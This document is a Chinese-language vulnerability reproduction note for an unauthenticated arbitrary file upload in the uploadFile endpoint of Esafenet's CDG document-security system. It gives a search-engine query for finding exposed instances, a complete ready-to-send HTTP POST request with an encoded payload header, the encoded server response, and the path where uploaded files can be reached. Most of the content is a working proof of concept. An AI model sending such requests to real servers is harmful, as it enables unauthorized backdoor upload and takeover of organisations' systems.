# 亿赛通电子文档安全管理系统uploadFile任意文件上传漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统uploadFile接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1706170000549-fdc86adb-1d49-443d-b3db-0a49c1a9ff04.png](./img/m4IM7b6tuy2o6nC3/1706170000549-fdc86adb-1d49-443d-b3db-0a49c1a9ff04-525849.png)

![1711288172901-1346b066-5e2d-4825-9082-5e0e82e24f69.png](./img/m4IM7b6tuy2o6nC3/1711288172901-1346b066-5e2d-4825-9082-5e0e82e24f69-766504.png)

# 四、漏洞复现
该漏洞是在在该域名8021端口下进行上传，上传的内容是在8443端口或者8090端口

上传文件

```plain
POST /file/uploadFile HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content: MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCMJIGHMNBBEBIAIKCHLENKGCPMEIIGODKKOEJJFEEIPNGHGBOOEIKNIOHIMCDONLKCEIFHIGKLHEGJNHMDAMIIELDOPGDKPOKKAHHDIMOJCJNHKMFABAFLFFDGEAJPIEOGPBNDHEOLDFBOFPFKBCEABHOPFDECBHBCFCEGO
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 144
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="file"
Content-Type: image/jpg

123
--00content0boundary00--
```

![1711288224792-c3d7eaa3-82db-4e39-afe9-4bdf5cc03fb3.png](./img/m4IM7b6tuy2o6nC3/1711288224792-c3d7eaa3-82db-4e39-afe9-4bdf5cc03fb3-142205.png)

```plain
CBDJCOKKKDJALCHGLOICCHCGLHNPDANBDGPPNLNLHMHLAAAGALIIHCBFPKNFHKOFEIOKAOMHAMHLILNEHEPEMGFFHOPCEPFAHHGPLHEJOKNNMLCMCCFDJNKECLEGOLOMMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGEJMJMMGCAKMOOBKBNECCMOMJMEDMPDAJBMNKIJFPFOPEFNDABHJCLAINBDMEEODMBGKLIHCLLONIIGNIEMCBNKAPNPFPLOHCGM
```

![1711288247140-9a262aae-7ed7-47ba-910f-1d3fb269cd07.png](./img/m4IM7b6tuy2o6nC3/1711288247140-9a262aae-7ed7-47ba-910f-1d3fb269cd07-977723.png)

![1711288273648-ef811a29-dcb7-4035-9a18-bc44f187757f.png](./img/m4IM7b6tuy2o6nC3/1711288273648-ef811a29-dcb7-4035-9a18-bc44f187757f-403907.png)

上传文件位置，在8443端口或者8090端口

```plain
https://ip:8443/CDGServer3/3g/stc.jsp
```

![1711288324445-93a6a907-0da7-436e-822c-ca495d9712bd.png](./img/m4IM7b6tuy2o6nC3/1711288324445-93a6a907-0da7-436e-822c-ca495d9712bd-945014.png)



> 更新: 2024-04-20 22:01:30  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dhcm5vbe1lakywrb>